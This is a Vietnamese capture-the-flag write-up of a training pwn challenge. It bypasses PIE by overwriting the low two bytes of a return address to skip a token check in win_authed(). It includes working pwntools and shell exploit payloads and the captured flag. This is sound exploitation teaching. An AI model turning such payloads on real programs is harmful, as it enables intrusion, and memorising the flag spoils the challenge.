## 📌 [Viettel Training Program] - PIEs (easy)

- **Category:** Binary Exploitation (Pwn)
- **Difficulty:** Easy
- **Points:** —
- **Description:** Lần này không có `win_variable` — cần ghi đè return address để redirect vào `win_authed()`. Nhưng binary là **PIE (Position Independent Executable)** — địa chỉ code được random. Chỉ có 2 byte thấp của địa chỉ là cố định. Binary: `binary-exploitation-pie-overflow-w` (source được cung cấp).

## 1. Khảo sát Ban đầu (Mitigation Check)

> Bước này giúp xác định các "lớp giáp" của file binary để biết phương pháp tấn công nào khả thi.

```bash
$ checksec ./binary-exploitation-pie-overflow-w
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

**Nhận xét nhanh:**

- **Không Stack Canary** → Có thể ghi đè return address.
- **NX enabled** → Không thể chạy shellcode trên stack, nhưng bài chỉ cần nhảy vào code có sẵn.
- **PIE enabled** → Địa chỉ code bị random mỗi lần chạy. **Không thể hardcode địa chỉ tuyệt đối** — cần dùng **partial overwrite** (chỉ ghi đè 2 byte thấp).

> Đây là lần đầu tiên gặp PIE trong chuỗi challenge. PIE random base address nhưng 12 bit thấp (page offset) luôn cố định.

## 2. Phân tích Tĩnh & Động (Reversing & Analysis)

### Phân tích mã nguồn

Hàm `challenge()` khai báo struct cục bộ:

```c
struct {
    char input[109];
} data = {0};

unsigned long size = 4096;
read(0, &data.input, size);

// Không có win_variable — phải hijack return address
return 0;
```

**Lỗi:** `read()` ghi tối đa 4096 byte vào buffer chỉ 109 byte → tràn stack, ghi đè saved RBP và return address.

Hàm `win_authed(int token)` kiểm tra `token != 0x1337` trước khi in flag. Mục tiêu: **nhảy qua token check** bằng cách nhảy vào địa chỉ ngay sau lệnh `jne`.

### Tính offset

Chương trình in sẵn offset tới return address:

```c
printf("which is stored at %p, %d bytes after the start of your input buffer.\n",
       rp_, rp_ - (unsigned long) &data.input);
printf("That means that you will need to input at least %d bytes ...\n",
       rp_ + 8 - (unsigned long) &data.input);
```

Từ disassembly (`objdump`), buffer nằm tại `rbp-0x80`, return address tại `rbp+8`:

| Thành phần | Vị trí stack | Offset từ `input` |
|------------|--------------|-------------------|
| `input[109]` | `rbp-0x80` … `rbp-0x13` | 0 – 108 |
| `size` | `rbp-0x8` | 120 – 127 |
| Saved RBP | `rbp+0` | 128 – 135 |
| **Saved return address** | **`rbp+8`** | **136 – 143** |

=> **Offset tới return address = 136 bytes**.

### Bypass token check (partial overwrite)

Token check trong `win_authed()`:

```asm
; win_authed tại offset 0x1c7b
1c8a:  cmpl   $0x1337, -0x4(%rbp)    ; if (token != 0x1337)
1c91:  jne    1d95 <win_authed+0x11a> ; → return (bỏ qua flag)
1c97:  lea    0x1452(%rip), %rdi      ; "You win!..."  ← target
```

Địa chỉ sau token check: `0x1c97` (offset trong binary). Vì PIE random base address, nhưng 2 byte thấp luôn cố định là `\x97\x1c`.

Kỹ thuật **partial overwrite**: chỉ ghi đè **2 byte thấp** của return address. 6 byte cao giữ nguyên từ địa chỉ cũ (vốn đã trỏ vào đúng vùng nhớ của binary).

### Phân tích động (GDB)

Dùng cyclic để xác nhận offset:

```text
$ gdb ./binary-exploitation-pie-overflow-w
pwndbg> cyclic 150
pwndbg> r
[...]
pwndbg> cyclic -l $rsp
[*] Found offset of 136
```

## 3. Ý tưởng Tấn công (Exploit Strategy)

1. Gửi **136 byte** padding (lấp input + size + saved RBP).
2. Ghi **2 byte** thấp của địa chỉ `win_authed+0x1c` (`0x1c97`) — tức `\x97\x1c`.
3. 6 byte cao của return address giữ nguyên từ địa chỉ cũ → chương trình nhảy đúng vào code sau token check.
4. `win_authed()` in flag mà không cần token `0x1337`.

> **Partial overwrite** là kỹ thuật quan trọng để bypass ASLR/PIE khi địa chỉ đích nằm cùng page/vùng nhớ với địa chỉ nguồn.

## 4. Mã Khai thác (Exploit Script)

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "info"

# exe = ELF("./binary-exploitation-pie-overflow-w")
# r = process("./binary-exploitation-pie-overflow-w")
r = remote("HOST", PORT)  # thay HOST/PORT khi deploy remote

OFFSET_RIP = 136   # offset từ input tới return address
# Partial overwrite: chỉ ghi 2 byte thấp của win_authed+0x1c (sau token check)
# 6 byte cao giữ nguyên (vì return address cũng trong cùng binary)
WIN_AUTHED_SKIP = 0x1c97  # offset của win_authed+0x1c

payload = flat({
    OFFSET_RIP: p16(WIN_AUTHED_SKIP),  # partial overwrite — 2 byte
})

r.sendafter(b"Send your payload", payload)

r.interactive()
```

Payload tối thiểu (local):

```python
from pwn import *
r = process("./binary-exploitation-pie-overflow-w")
r.sendafter(b"Send your payload", b"A" * 136 + b"\x97\x1c")
r.interactive()
```

Hoặc không dùng pwntools (local):

```bash
python3 -c '
import sys
# 136 byte padding + 2 byte partial overwrite
payload = b"A" * 136 + b"\x97\x1c"
sys.stdout.buffer.write(payload)
' | ./binary-exploitation-pie-overflow-w
```

## 5. Kết quả & Flag

Chạy exploit trên môi trường challenge (có `/flag`, binary SUID nếu yêu cầu):

```text
Send your payload (up to 4096 bytes)!
...
WARNING: You sent in too much data, and overwrote more than two bytes of the address.
         This can still work, because I told you the correct address to use for
         this execution, but you should not rely on that information.
         You can solve this challenge by only overwriting two bytes!

Goodbye!
You win! Here is your flag:
pwn.college{0YsQs58MaoS6lhgJ2aK2FrjHdxM.dNTOywSMzgjNwEzW}
```

> Lưu ý: Nếu ghi hơn 2 byte (ghép thêm `\x97\x1c` với padding null), chương trình vẫn in flag nhưng cảnh báo "overwrote more than two bytes". Cách đúng là chỉ ghi đúng 2 byte.

*(Local không có `/flag` sẽ thấy lỗi mở file — vẫn chứng minh `win_authed()` đã được gọi.)*

**Lessons Learned (Bài học rút ra):**

- **PIE bypass với partial overwrite:** Khi PIE enabled, không thể hardcode địa chỉ tuyệt đối. Giải pháp là chỉ ghi đè 2 byte thấp (12 bit cuối không đổi), giữ nguyên 6 byte cao.
- **ret2win + bypass auth:** Nhảy vào giữa hàm `win_authed()`, ngay sau lệnh kiểm tra token — kỹ thuật **return-to-middle**.
- **Offset tới return address = 136 byte** (input[109] + padding + size + saved RBP).
- **Không copy offset từ bài trước** — mỗi binary có stack layout riêng.
- Partial overwrite là nền tảng cho các bài ROP với PIE enabled ở cấp độ cao hơn.
